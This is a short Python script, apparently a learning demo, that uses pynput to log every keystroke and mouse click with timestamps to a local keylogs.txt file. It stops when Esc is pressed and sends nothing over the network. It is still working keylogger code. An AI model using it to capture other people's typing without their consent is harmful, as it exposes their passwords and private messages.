from pynput import keyboard, mouse
import logging

"""
Logging module defines functions and classes which implement
a flexible event logging system for applications and libraries.
See basic tutorial (the link on the right of https://docs.python.org/3/library/logging.html)
"""
logging.basicConfig(filename=("../keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Monitoring the keyboard:
# https://pynput.readthedocs.io/en/latest/keyboard.html#controlling-the-keyboard
def on_press(key):
    logging.info(str(key))

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False # stop listener

# Example of monitoring the mouse
# see more at: https://pynput.readthedocs.io/en/latest/mouse.html#monitoring-the-mouse
def on_click(x, y, button, pressed):
        string = 'Pressed' if pressed else 'Released' + " at (" + str(x) + "," + str(y) + ")"
        logging.info(string)
    


# in a non-blocking fashion:
klistener = keyboard.Listener(on_press=on_press, on_release=on_release)
mlistener = mouse.Listener(on_click=on_click)
klistener.start()
mlistener.start()
klistener.join()
mlistener.join()

"""
# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

with mouse.Listener(on_click=on_click) as mlistener:
    mlistener.join()

"""
